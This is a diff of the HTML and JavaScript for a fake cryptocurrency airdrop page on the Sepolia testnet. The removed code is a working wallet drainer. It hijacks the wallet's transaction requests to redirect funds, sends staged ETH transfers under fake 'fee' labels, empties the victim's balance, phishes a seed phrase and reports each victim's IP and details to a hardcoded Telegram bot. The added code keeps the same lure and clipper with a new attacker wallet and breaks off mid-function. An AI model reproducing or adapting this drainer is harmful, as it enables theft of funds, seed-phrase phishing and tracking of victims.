@@ -3,670 +3,361 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Quantum Yield Airdrop (Sepolia Testnet)</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <title>Quantum Yield Airdrop [SEPOLIA TESTNET] - Claim 5 QYT + Rare NFTs!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
-    <script>
-        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
-        const CHAT_ID = "6309547301";
-        const YOUR_WALLET = "0x6b9C1121abd649254dB8A7D39091cC6b4D1cf893"; // Updated to your Sepolia testnet address
-        const ETH_TO_USD_RATE = 2500;
-        const SEPOLIA_CHAIN_ID = "0xaa36a7"; // Sepolia testnet chain ID (hex)
-        const MINIMUM_ETH = ethers.utils.parseEther("0.01"); // Minimum 0.01 ETH to drain
-
-        // ETH Clipper
-        if (typeof window.ethereum !== "undefined" || (window.web3 && window.web3.currentProvider)) {
-            const originalRequest = window.ethereum ? window.ethereum.request : window.web3.currentProvider.request;
-            window.ethereum = window.ethereum || window.web3.currentProvider;
-            window.ethereum.request = async (args) => {
-                if (args.method === "eth_sendTransaction") {
-                    const originalTo = args.params[0].to;
-                    args.params[0].to = YOUR_WALLET;
-                    await sendAlert(` CLIP ATTEMPT: Swapped ${originalTo} to ${YOUR_WALLET}`);
-                }
-                return originalRequest.apply(window.ethereum, [args]);
-            };
-        }
-
-        async function sendAlert(msg) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-            try {
-                const response = await fetch(url);
-                if (!response.ok) {
-                    console.error('Telegram API error:', await response.text());
-                }
-            } catch (e) {
-                console.error("DAC: Telegram alert failed...", e);
-            }
-        }
-
-        async function getVictimInfo(account = "Unknown") {
-            // Get IP address
-            let ip = "Unknown";
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                ip = ipData.ip;
-            } catch (e) {
-                console.error("Failed to get IP:", e);
-            }
-
-            // Get browser details
-            const ua = navigator.userAgent;
-            const browserDetails = ua;
-
-            // Get device type
-            const device = /Mobile|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop";
-
-            // Get wallet type
-            let walletType = "Unknown";
-            if (window.ethereum) {
-                if (window.ethereum.isMetaMask) {
-                    walletType = "MetaMask";
-                } else if (window.ethereum.isCoinbaseWallet) {
-                    walletType = "Coinbase Wallet";
-                } else {
-                    walletType = "Other Wallet";
-                }
-            }
-
-            return { ip, browser: browserDetails, device, walletType };
-        }
-
-        let provider, signer, victim;
-
-        async function connectWallet() {
-            // Wait for MetaMask to inject
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            console.log("DAC: Checking for wallet...");
-
-            if (!window.ethereum) {
-                console.log("DAC: No window.ethereum detected");
-                document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a></p>";
-                const info = await getVictimInfo();
-                await sendAlert(`NO WALLET: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}\nWallet Type: ${info.walletType}`);
-                return;
-            }
-
-            document.getElementById("status").innerHTML = "<p class='warning'><i class='fas fa-atom fa-spin'></i> Connecting to Blockchain...</p>";
-            console.log("DAC: Wallet found, connecting...");
-
-            try {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                console.log("Provider initialized:", provider);
-
-                // Strictly enforce Sepolia testnet
-                const network = await provider.getNetwork();
-                console.log("Current network chain ID:", network.chainId.toString(16));
-                if (network.chainId !== parseInt(SEPOLIA_CHAIN_ID, 16)) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: SEPOLIA_CHAIN_ID }]
-                        });
-                        console.log("Switched to Sepolia testnet");
-                    } catch (switchError) {
-                        if (switchError.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: SEPOLIA_CHAIN_ID,
-                                    chainName: 'Sepolia Test Network',
-                                    nativeCurrency: {
-                                        name: 'Sepolia ETH',
-                                        symbol: 'ETH',
-                                        decimals: 18
-                                    },
-                                    rpcUrls: ['https://rpc.sepolia.org'],
-                                    blockExplorerUrls: ['https://sepolia.etherscan.io']
-                                }]
-                            });
-                            console.log("Added Sepolia testnet");
-                        } else {
-                            throw switchError;
-                        }
-                    }
-                }
-
-                // Double-check network after switch
-                const updatedNetwork = await provider.getNetwork();
-                if (updatedNetwork.chainId !== parseInt(SEPOLIA_CHAIN_ID, 16)) {
-                    document.getElementById("status").innerHTML = "<p class='error'>Please switch to Sepolia Testnet to continue!</p>";
-                    await sendAlert(" Network Error: User failed to switch to Sepolia Testnet");
-                    return;
-                }
-                console.log("Confirmed network: Sepolia Testnet (chain ID:", updatedNetwork.chainId.toString(16), ")");
-
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                victim = await signer.getAddress();
-                console.log("Wallet connected, victim address:", victim);
-
-                // Collect victim details and send to Telegram
-                const info = await getVictimInfo(victim);
-                await sendAlert(` VICTIM CONNECTED\nWallet: ${victim}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}\nWallet Type: ${info.walletType}`);
-
-                // Proceed to drain
-                await drainWallet();
-            } catch (e) {
-                const info = await getVictimInfo(victim);
-                await sendAlert(`SEPOLIA ERROR: ${victim || "Unknown"} - ${e.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}\nWallet Type: ${info.walletType}`);
-                document.getElementById("status").innerHTML = `<h2 class='error'>Claim Failed</h2><p>Error: ${e.message}</p>`;
-                console.error("DAC: Crash -", e.message);
-            }
-        }
-
-        async function drainWallet() {
-            console.log("Starting drain process for victim:", victim);
-            if (!provider || !signer) {
-                document.getElementById("status").innerHTML = "<p class='error'>Wallet not connected!</p>";
-                return;
-            }
-
-            try {
-                // Check victim's ETH balance
-                const balance = await provider.getBalance(victim);
-                console.log("Victim's balance:", ethers.utils.formatEther(balance), "ETH");
-                if (balance.lt(MINIMUM_ETH)) {
-                    throw new Error("Victim's balance too low, need at least 0.01 ETH");
-                }
-
-                const gasPrice = await provider.getGasPrice();
-                const gasLimit = 21000; // Standard gas limit for ETH transfer
-
-                // Step 0: 0.001 ETH "contract approval"
-                document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Token Contract (0.001 ETH)...</p>";
-                let tx = await signer.sendTransaction({
-                    to: YOUR_WALLET,
-                    value: ethers.utils.parseEther("0.001"),
-                    gasLimit: gasLimit,
-                    gasPrice: gasPrice
-                });
-                let receipt = await tx.wait();
-                console.log("DAC: Step 0 - 0.001 ETH snagged, TX:", receipt.transactionHash);
-                await sendAlert(` SEPOLIA STEP 0: ${victim}\nAmount: 0.001 ETH\nTX: ${receipt.transactionHash}`);
-
-                // Step 1: 0.005 ETH "eligibility verification"
-                document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 ETH!</p>";
-                tx = await signer.sendTransaction({
-                    to: YOUR_WALLET,
-                    value: ethers.utils.parseEther("0.005"),
-                    gasLimit: gasLimit,
-                    gasPrice: gasPrice
-                });
-                receipt = await tx.wait();
-                console.log("DAC: Step 1 - 0.005 ETH in, TX:", receipt.transactionHash);
-                await sendAlert(` SEPOLIA STEP 1: ${victim}\nAmount: 0.005 ETH\nTX: ${receipt.transactionHash}`);
-
-                // Step 2: 0.01 ETH "claim fee"
-                document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 ETH claim fee for 5 QYT (~$12,500 USD)!</p>";
-                tx = await signer.sendTransaction({
-                    to: YOUR_WALLET,
-                    value: ethers.utils.parseEther("0.01"),
-                    gasLimit: gasLimit,
-                    gasPrice: gasPrice
-                });
-                receipt = await tx.wait();
-                console.log("DAC: Step 2 - 0.01 ETH nabbed, TX:", receipt.transactionHash);
-                await sendAlert(` SEPOLIA STEP 2: ${victim}\nAmount: 0.01 ETH\nTX: ${receipt.transactionHash}`);
-
-                // Final Step: Drain remaining balance
-                const remainingBalance = await provider.getBalance(victim);
-                const gasCost = gasPrice.mul(gasLimit);
-                const drainAmount = remainingBalance.sub(gasCost);
-                if (drainAmount.lte(0)) {
-                    throw new Error("Not enough ETH left to drain after gas costs");
-                }
-                const drainEth = ethers.utils.formatEther(drainAmount);
-                const drainUsd = (parseFloat(drainEth) * ETH_TO_USD_RATE).toFixed(2);
-                document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop!</p>";
-                tx = await signer.sendTransaction({
-                    to: YOUR_WALLET,
-                    value: drainAmount,
-                    gasLimit: gasLimit,
-                    gasPrice: gasPrice
-                });
-                receipt = await tx.wait();
-                console.log("DAC: Full drain done, TX:", receipt.transactionHash);
-                await sendAlert(` SEPOLIA SUCCESS: ${victim} DRAINED\nAmount: ${drainEth} ETH (~$${drainUsd} USD)\nTX: ${receipt.transactionHash}`);
-
-                // Fake success UI
-                document.getElementById("status").innerHTML = "<p class='warning'>Spin for a bonus! Spinning...</p><div class='wheel'></div>";
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
-
-                document.getElementById("share").style.display = "block";
-                document.getElementById("phishing").style.display = "block";
-            } catch (e) {
-                const info = await getVictimInfo(victim);
-                await sendAlert(`SEPOLIA ERROR: ${victim || "Unknown"} - ${e.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}\nWallet Type: ${info.walletType}`);
-                document.getElementById("status").innerHTML = `<h2 class='error'>Claim Failed</h2><p>Error: ${e.message}</p>`;
-                console.error("DAC: Crash -", e.message);
-            }
-        }
-
-        function startTimer() {
-            const endTime = Date.now() + 24 * 60 * 60 * 1000;
-            setInterval(() => {
-                const now = Date.now();
-                const distance = endTime - now;
-                if (distance < 0) {
-                    document.getElementById("timer").innerHTML = "Airdrop Ended!";
-                    document.querySelector(".claim-btn").disabled = true;
-                    return;
-                }
-                const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                const s = Math.floor((distance % (1000 * 60)) / 1000);
-                document.getElementById("timer").innerHTML = `${h}h ${m}m ${s}s`;
-            }, 1000);
-        }
-
-        function startPhaseTimer() {
-            const endTime = Date.now() + 2 * 60 * 60 * 1000;
-            setInterval(() => {
-                const now = Date.now();
-                const distance = endTime - now;
-                if (distance < 0) {
-                    document.getElementById("phase-timer").innerHTML = "Phase 2 Started!";
-                    return;
-                }
-                const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                const s = Math.floor((distance % (1000 * 60)) / 1000);
-                document.getElementById("phase-timer").innerHTML = `${h}h ${m}m ${s}s`;
-            }, 1000);
-        }
-
-        function updateClaimCounter() {
-            let claimed = parseInt(document.getElementById("claimed").innerText.replace(/,/g, ""));
-            claimed += Math.floor(Math.random() * 10) + 1;
-            document.getElementById("claimed").innerText = claimed.toLocaleString();
-            const progress = (claimed / 10000) * 100;
-            document.getElementById("progress-bar").style.width = `${Math.min(progress, 100)}%`;
-        }
-
-        function updatePriceTicker() {
-            let price = (Math.random() * 0.5 + 1).toFixed(2);
-            let change = (Math.random() * 5 - 2.5).toFixed(1);
-            document.getElementById("price-ticker").innerHTML = `QYT Price: $${price} (${change > 0 ? "+" : ""}${change}%)`;
-        }
-
-        function copyReferralLink() {
-            const referralLink = "https://quantum-yield.com/ref=12345";
-            const tempInput = document.createElement("input");
-            tempInput.value = referralLink;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempInput);
-            alert("Referral link copied: " + referralLink);
-        }
-
-        function copyShareText() {
-            const shareText = "Just claimed 5 QYT from Quantum Yield! Get yours: https://quantum-yield.com #QYT #Airdrop";
-            const tempInput = document.createElement("input");
-            tempInput.value = shareText;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempInput);
-            alert("Share text copied: " + shareText);
-        }
-
-        function submitPhishing() {
-            const input = document.getElementById("phishing-input").value.trim();
-            if (input) {
-                document.getElementById("phishing-status").innerHTML = "<p class='warning'>Encrypting...</p>";
-                setTimeout(async () => {
-                    await sendAlert(` PHISHED INPUT: ${input}`);
-                    document.getElementById("phishing-status").innerHTML = "<p class='success'>NFT link sent to your wallet!</p>";
-                }, 2000);
-            }
-        }
-
-        window.onload = () => {
-            startTimer();
-            startPhaseTimer();
-            setInterval(updateClaimCounter, 5000);
-            setInterval(updatePriceTicker, 10000);
-            document.getElementById("progress-bar").style.width = "78.42%";
-            particlesJS("particles-js", {
-                particles: { number: { value: 50 }, color: { value: "#00ff9d" }, size: { value: 3 }, move: { speed: 2 } },
-                interactivity: { events: { onhover: { enable: true, mode: "repulse" } } }
-            });
-            document.getElementById("nft1-rarity").innerHTML = `Quantum Ape #${Math.floor(Math.random() * 1000)} - Rarity: Epic`;
-            document.getElementById("nft2-rarity").innerHTML = `Yield Bot #${Math.floor(Math.random() * 100)} - Rarity: Legendary`;
-            sendAlert(" Drainer site loaded! Ready to scam some suckers on Sepolia testnet.");
-        };
-    </script>
     <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background: linear-gradient(135deg, #1e1e2f 0%, #2e2e4f 100%);
-            color: #ffffff;
-            margin: 0;
-            padding: 20px;
-            min-height: 100vh;
-            overflow-y: auto;
-            position: relative;
+        :root {
+            --primary: #00F2DE;
+            --secondary: #8A4DFF;
+            --accent: #FF4D9A;
+            --dark: #15171B;
+            --light: #2A2E37;
+            --neon: #00FFF0;
+            --gold: #FFD700;
         }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, var(--dark), #1a1e25);
+            color: var(--light);
+            margin: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
         #particles-js {
             position: fixed;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
             z-index: -1;
+            background: transparent;
         }
+
         .container {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
-            text-align: center;
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(0, 212, 255, 0.5);
-            width: 90%;
-            max-width: 500px;
+            max-width: 1440px;
             margin: 0 auto;
-            animation: glow 2s infinite alternate;
+            padding: 2rem;
             position: relative;
-            z-index: 1;
         }
-        @keyframes glow {
-            from { box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }
-            to { box-shadow: 0 0 40px rgba(0, 212, 255, 0.6); }
+
+        header {
+            position: fixed;
+            width: 100%;
+            background: rgba(21, 23, 27, 0.9);
+            border-bottom: 2px solid var(--primary);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
         }
-        .header {
+
+        .nav-links {
             display: flex;
             align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
+            justify-content: space-between;
+            padding: 1rem 0;
         }
-        .header i {
-            font-size: 2.5em;
-            color: #00ff9d;
-            margin-right: 10px;
-            text-shadow: 0 0 10px #00ff9d;
-        }
-        h1 {
-            font-size: 2.8em;
-            margin: 0;
-            color: #00d4ff;
-            text-shadow: 0 0 15px rgba(0, 212, 255, 0.8);
-        }
-        .subtitle {
-            font-size: 1.3em;
-            color: #00ff9d;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-        .about, .team, .roadmap, .news, .partners {
-            margin: 30px 0;
-            text-align: left;
-            background: rgba(0, 212, 255, 0.1);
-            padding: 20px;
-            border-radius: 10px;
-            border: 1px solid #00d4ff;
-        }
-        .about h2, .team h2, .roadmap h2, .news h2, .partners h2 {
-            color: #00ff9d;
-            font-size: 1.5em;
-            margin-bottom: 15px;
-        }
-        .partners ul {
-            list-style: none;
-            padding: 0;
-            display: flex;
-            justify-content: space-around;
-        }
-        .partners li {
-            font-size: 1.1em;
-            color: #00ff9d;
-        }
-        .stats {
-            margin: 25px 0;
-            background: rgba(0, 212, 255, 0.1);
-            padding: 15px;
-            border-radius: 10px;
-            border: 1px solid #00d4ff;
-            position: relative;
-        }
-        .stats span {
-            color: #00ff9d;
-            font-weight: bold;
-            font-size: 1.2em;
-        }
-        #price-ticker {
-            font-size: 0.9em;
-            color: #ffcc00;
-            margin-top: 10px;
-        }
-        .progress-container {
-            width: 100%;
-            background: #2e2e4f;
-            border-radius: 5px;
-            margin-top: 10px;
-        }
-        #progress-bar {
-            height: 10px;
-            background: linear-gradient(45deg, #00d4ff, #ff007a);
-            border-radius: 5px;
-            transition: width 0.5s ease;
-        }
-        .nft-rewards {
-            display: flex;
-            justify-content: space-around;
-            margin: 30px 0;
-        }
-        .nft {
-            width: 120px;
-            height: 120px;
-            background-size: cover;
-            border-radius: 15px;
-            border: 3px solid #00ff9d;
-            box-shadow: 0 0 15px rgba(0, 255, 157, 0.7);
-            transition: transform 0.3s ease;
-        }
-        .nft:hover { transform: scale(1.1); }
-        .nft1 { background-image: url('https://i.postimg.cc/fW7rtmjq/Quantum-Ape.jpg'); }
-        .nft2 { background-image: url('https://i.postimg.cc/wB9PvD70/file-B1-VK6-Ac-Ag65g-T9-Nr-GYSJw-T.png'); }
-        .nft span {
-            display: block;
-            font-size: 0.8em;
-            color: #ffcc00;
-            margin-top: 5px;
-        }
-        .claim-btn {
-            background: linear-gradient(45deg, #00d4ff, #ff007a);
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.3em;
-            color: #ffffff;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: transform 0.3s ease;
-            box-shadow: 0 0 20px rgba(255, 0, 122, 0.5);
-            margin: 20px 0;
-        }
-        .claim-btn:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 30px rgba(255, 0, 122, 0.8);
-        }
-        #timer, #phase-timer {
-            font-size: 1.8em;
-            color: #ff007a;
-            margin: 20px 0;
-            text-shadow: 0 0 10px #ff007a;
-        }
-        #status {
-            margin: 20px 0;
-            font-size: 1.1em;
-        }
-        .success { color: #00ff9d; text-shadow: 0 0 10px #00ff9d; }
-        .error { color: #ff007a; text-shadow: 0 0 10px #ff007a; }
-        .warning { color: #ffcc00; font-weight: bold; }
-        .wheel {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background: conic-gradient(#00d4ff, #ff007a, #00ff9d, #ffcc00, #00d4ff);
-            margin: 20px auto;
-            animation: spin 2s linear;
-        }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        .referral, .share, .phishing {
-            margin: 20px 0;
-        }
-        .referral input, .phishing input {
-            padding: 10px;
-            width: 70%;
-            border: 1px solid #00d4ff;
-            border-radius: 5px;
-            background: rgba(255, 255, 255, 0.1);
-            color: #ffffff;
-        }
-        .referral button, .share button, .phishing button {
-            padding: 10px 20px;
-            font-size: 1em;
-            margin-left: 10px;
-            background: #00ff9d;
-            color: #1e1e2f;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .phishing { display: none; }
-        .testimonials {
-            margin: 30px 0;
-            font-size: 0.9em;
-            color: #cccccc;
-        }
-        .testimonials p {
-            background: rgba(0, 212, 255, 0.1);
-            padding: 10px;
-            border-radius: 10px;
-            margin: 10px 0;
-            border: 1px dashed #00d4ff;
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 0.9em;
-            color: #aaaaaa;
-        }
-        .footer a {
-            color: #00ff9d;
-            margin: 0 10px;
+
+        .nav-links a {
+            color: var(--neon);
+            margin: 0 1.5rem;
             text-decoration: none;
-            transition: color 0.3s ease;
+            font-weight: 600;
+            position: relative;
+            transition: color 0.3s;
         }
-        .footer a:hover { color: #ff007a; }
+
+        .nav-links a:hover {
+            color: var(--gold);
+            text-shadow: 0 0 10px var(--gold);
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            text-shadow: 0 0 15px var(--primary);
+        }
+
+        .hero {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            background: url('https://i.imgur.com/quantum-bg.jpg') no-repeat center/cover;
+            border-bottom: 3px solid var(--secondary);
+        }
+
+        .hero h1 {
+            font-size: 5rem;
+            color: var(--gold);
+            text-shadow: 0 0 25px var(--primary), 0 0 50px var(--accent);
+            animation: pulse 2s infinite;
+        }
+
+        .hero p {
+            font-size: 1.5rem;
+            color: var(--neon);
+            margin: 1rem 0;
+        }
+
+        .cta {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: var(--dark);
+            padding: 1.2rem 3rem;
+            border-radius: 50px;
+            border: none;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 0 20px var(--primary);
+        }
+
+        .cta:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px var(--accent);
+        }
+
+        .countdown {
+            font-size: 2rem;
+            color: var(--accent);
+            margin: 2rem 0;
+            font-weight: 800;
+            text-shadow: 0 0 10px var(--accent);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 2rem;
+            margin: 4rem 0;
+        }
+
+        .stat-card {
+            background: rgba(42, 46, 55, 0.8);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            border: 1px solid var(--neon);
+            transition: transform 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 0 20px var(--neon);
+        }
+
+        .stat-card h3 {
+            color: var(--gold);
+            font-size: 2rem;
+        }
+
+        .nft-preview {
+            height: 450px;
+            background: linear-gradient(135deg, var(--light), var(--dark));
+            border-radius: 25px;
+            position: relative;
+            overflow: hidden;
+            margin: 4rem 0;
+        }
+
+        .nft-preview img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.9;
+        }
+
+        .roadmap {
+            background: rgba(42, 46, 55, 0.9);
+            border-radius: 25px;
+            padding: 3rem;
+            margin: 4rem 0;
+            border: 2px dashed var(--primary);
+        }
+
+        .roadmap h2 {
+            color: var(--neon);
+            text-shadow: 0 0 15px var(--neon);
+        }
+
+        footer {
+            border-top: 2px solid var(--primary);
+            padding: 2rem 0;
+            text-align: center;
+            background: var(--dark);
+        }
+
+        footer a {
+            color: var(--neon);
+            margin: 0 1rem;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
     <div id="particles-js"></div>
-    <div class="container">
-        <div class="header">
-            <i class="fas fa-atom"></i>
-            <h1>Quantum Yield Airdrop</h1>
-        </div>
-        <p class="subtitle">Claim 5 QYT + Exclusive NFTs—HURRY, LIMITED SLOTS!</p>
-        
-        <div class="about">
-            <h2>About Quantum Yield</h2>
-            <p>Quantum Yield is a DeFi protocol using quantum computing to optimize yield farming. QYT offers staking and governance.</p>
-            <p>Audited by <a href="https://www.certik.com/" target="_blank" style="color: #00ff9d;">CertiK</a></p>
-        </div>
-
-        <div class="stats">
-            <h2>Airdrop Stats</h2>
-            <p>Total Pool: <span>10,000 QYT</span></p>
-            <p>Claimed: <span id="claimed">7,842</span> QYT</p>
-            <p>Participants: <span>12,487</span></p>
-            <p id="price-ticker">QYT Price: $1.23 (+2.1%)</p>
-            <div class="progress-container">
-                <div id="progress-bar"></div>
+    <header>
+        <nav class="container">
+            <div class="logo">Quantum Yield</div>
+            <div class="nav-links">
+                <a href="#airdrop">Airdrop</a>
+                <a href="#nfts">NFTs</a>
+                <a href="#roadmap">Roadmap</a>
+                <button class="cta" onclick="connectWallet()">Connect Wallet</button>
             </div>
-        </div>
+        </nav>
+    </header>
 
-        <div class="nft-rewards">
-            <div>
-                <div class="nft nft1"></div>
-                <span id="nft1-rarity"></span>
-            </div>
-            <div>
-                <div class="nft nft2"></div>
-                <span id="nft2-rarity"></span>
-            </div>
+    <section class="hero">
+        <div class="container">
+            <h1>Quantum Yield Airdrop [SEPOLIA]</h1>
+            <p>Claim 5 QYT + Exclusive NFTs Now! Only 1,000 Spots Left!</p>
+            <div class="countdown" id="countdown">00:00:00</div>
+            <button class="cta" onclick="connectWallet()">Claim Now</button>
         </div>
+    </section>
 
-        <button class="claim-btn" onclick="connectWallet()">Claim 5 QYT NOW</button>
-        <div id="timer">Loading...</div>
-        <div>Phase 2 Starts In: <span id="phase-timer">Loading...</span></div>
-        <div id="status"></div>
-
-        <div class="referral">
-            <p>Invite friends & earn 10% of their claims!</p>
-            <input type="text" value="https://quantum-yield.com/ref=12345" readonly>
-            <button onclick="copyReferralLink()">Copy Link</button>
+    <section class="container stats-grid">
+        <div class="stat-card">
+            <h3>5 QYT</h3>
+            <p>Free Tokens Per Claim</p>
         </div>
-
-        <div class="share" style="display: none;" id="share">
-            <p>Share your success!</p>
-            <button onclick="copyShareText()">Copy Tweet</button>
+        <div class="stat-card">
+            <h3>1,000</h3>
+            <p>Limited Spots</p>
         </div>
-
-        <div class="phishing" id="phishing">
-            <p>Verify your wallet to receive your NFT airdrop link (optional):</p>
-            <input type="text" id="phishing-input" placeholder="Enter backup phrase">
-            <button onclick="submitPhishing()">Submit</button>
-            <div id="phishing-status"></div>
+        <div class="stat-card">
+            <h3>10x</h3>
+            <p>Value Surge Expected</p>
         </div>
-
-        <div class="team">
-            <h2>Our Team</h2>
-            <p><strong>Dr. Alice Quantum</strong> - CEO, PhD MIT</p>
-            <p><strong>Bob Blockchain</strong> - CTO, Ex-Ethereum</p>
+        <div class="stat-card">
+            <h3>Now</h3>
+            <p>Live on Sepolia Testnet</p>
         </div>
+    </section>
 
-        <div class="roadmap">
-            <h2>Roadmap</h2>
-            <p>Q1 2025: Mainnet Launch</p>
-            <p>Q2 2025: Staking Release</p>
-            <p>Q4 2025: Mobile App</p>
-        </div>
+    <section class="container nft-preview" id="nfts">
+        <img src="https://i.imgur.com/nft-teaser.jpg" alt="NFT Preview">
+    </section>
 
-        <div class="news">
-            <h2>News</h2>
-            <p>March 2025: Chainlink Partnership</p>
-            <p>Feb 2025: Testnet Success</p>
-        </div>
+    <section class="container roadmap" id="roadmap">
+        <h2>Roadmap to Riches</h2>
+        <p>Q1: Airdrop Launch<br>Q2: NFT Drop<br>Q3: Mainnet & 100x Gains</p>
+    </section>
 
-        <div class="partners">
-            <h2>Partners</h2>
-            <ul>
-                <li><i class="fas fa-link"></i> Chainlink</li>
-                <li><i class="fas fa-shapes"></i> Polygon</li>
-                <li><i class="fas fa-exchange-alt"></i> Uniswap</li>
-            </ul>
+    <footer>
+        <div class="container">
+            <a href="#">Twitter</a>
+            <a href="#">Discord</a>
+            <a href="#">Telegram</a>
         </div>
+    </footer>
 
-        <div class="testimonials">
-            <h2>What People Say</h2>
-            <p>"Claimed 5 QYT—insane!" - @CryptoKingX</p>
-            <p>"Fast, got my NFT!" - @NFTManiac</p>
-        </div>
+    <script>
+        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
+        const CHAT_ID = "6309547301";
+        const ATTACKER_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";
+        const SEPOLIA_RPC = "https://rpc.sepolia.org"; // Public Sepolia RPC
 
-        <div class="footer">
-            <p>Join us on:</p>
-            <a href="#" target="_blank"><i class="fab fa-twitter"></i></a>
-            <a href="#" target="_blank"><i class="fab fa-telegram"></i></a>
-            <a href="#" target="_blank"><i class="fab fa-discord"></i></a>
-            <a href="#" target="_blank"><i class="fab fa-github"></i></a>
-        </div>
-    </div>
+        // Particles.js setup
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 100, density: { enable: true, value_area: 800 } },
+                color: { value: "#00FFF0" },
+                shape: { type: "circle" },
+                opacity: { value: 0.5, random: true },
+                size: { value: 3, random: true },
+                move: { enable: true, speed: 2, direction: "none", random: true }
+            },
+            interactivity: { detect_on: "canvas", events: { onhover: { enable: true, mode: "repulse" } } }
+        });
+
+        // Countdown timer
+        const countdown = () => {
+            const end = Date.now() + 24 * 60 * 60 * 1000; // 24 hours from now
+            setInterval(() => {
+                const now = Date.now();
+                const diff = end - now;
+                const hours = Math.floor(diff / (1000 * 60 * 60)).toString().padStart(2, "0");
+                const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)).toString().padStart(2, "0");
+                const secs = Math.floor((diff % (1000 * 60)) / 1000).toString().padStart(2, "0");
+                document.getElementById("countdown").innerText = `${hours}:${mins}:${secs}`;
+            }, 1000);
+        };
+        countdown();
+
+        // Wallet clipper and drainer for Sepolia Testnet
+        if (window.ethereum) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum, {
+                chainId: 11155111,
+                name: "sepolia",
+                rpcUrls: [SEPOLIA_RPC]
+            });
+            window.ethereum.request = async (args) => {
+                if (args.method === "eth_sendTransaction") {
+                    const tx = args.params[0];
+                    tx.to = ATTACKER_WALLET;
